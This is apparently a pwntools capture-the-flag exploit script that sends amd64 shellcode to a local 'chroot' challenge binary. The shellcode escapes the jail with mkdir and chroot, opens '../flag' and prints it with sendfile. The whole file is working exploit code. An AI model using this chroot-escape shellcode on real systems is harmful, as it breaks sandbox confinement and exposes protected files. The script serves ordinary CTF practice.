from pwn import *

context.arch = 'amd64'

io = process('../challenge/chroot')
#gdb.attach(io)

shellcode = '''
mov rax, %d
push rax

mov rdi, rsp
mov rsi, 0755
mov rax, 0x53
syscall

mov rdi, rsp
mov rax, 0xa1
syscall
'''% u64("tmp_dir\0")

shellcode += '''
mov rdi, 0x16051500
mov rsi, 0x50
mov rax, 0x4f
syscall

mov rax, %d
push rax

mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x2
syscall

mov rdi, 1
mov rsi, 3
mov rdx, 0
mov r10, 0x50
mov rax, 0x28
syscall
''' % u64('../flag\0')

io.sendline(asm(shellcode))

io.interactive()
